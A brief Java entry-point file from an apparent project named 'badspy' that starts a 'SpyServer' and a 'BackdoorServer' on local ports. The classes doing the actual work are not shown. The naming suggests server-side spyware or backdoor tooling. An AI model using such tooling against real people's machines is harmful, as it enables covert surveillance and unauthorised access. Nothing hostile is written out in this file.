package com.blogspot.sontx.badspy.badserver;

import com.blogspot.sontx.badspy.badserver.bo.BackdoorServer;
import com.blogspot.sontx.badspy.badserver.bo.SpyServer;

import java.io.IOException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 20/4/2016.
 */
public final class Program {
    public static void main(String[] args) {
        try {
            SpyServer spyServer = new SpyServer("localhost", 2512);
            BackdoorServer backdoorServer = new BackdoorServer("localhost", 3393);
            spyServer.start();
            backdoorServer.start();
            System.in.read();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
